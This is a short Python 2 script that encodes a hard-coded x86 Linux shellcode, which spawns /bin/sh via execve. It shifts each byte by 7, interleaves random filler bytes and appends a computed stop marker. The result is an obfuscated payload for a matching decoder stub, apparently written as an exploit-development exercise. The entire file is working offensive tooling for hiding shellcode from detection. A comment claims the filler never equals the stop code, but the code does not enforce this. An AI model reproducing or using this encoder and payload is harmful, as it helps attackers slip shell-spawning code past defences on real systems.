#!/usr/bin/python

import random
import sys, os

def get_stop_code(shellcode):
	list_codes = bytearray(shellcode)
	min_number = min(list_codes)
	max_number = max(list_codes)
	stop_code = 0
	for i in range (max_number,min_number,-1):
			if i not in list_codes:
				stop_code = i
				break
	if stop_code is 0:
		print "You are using all opcodes, we can not use this encoding :/"
		sys.exit(1)
	return stop_code


shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

def encoded(hex_stop_code):
	encoded2 = ""
	for x in bytearray(shellcode) :	
		# Value 1: Encoded 'x'
		x = x - 7
		encoded2 += '0x'
		encoded2 += '%02x,' %x
		# Value 2: Random value != stop_code
		rand_number = random.randint(1,10)
		encoded2 += '0x%02x,' % rand_number

	encoded2 += '0x'+hex_stop_code+',0x'+hex_stop_code
	return encoded2


stop_code = get_stop_code(shellcode)
hex_stop_code = '{:02X}'.format(stop_code).lower()
print encoded(hex_stop_code)

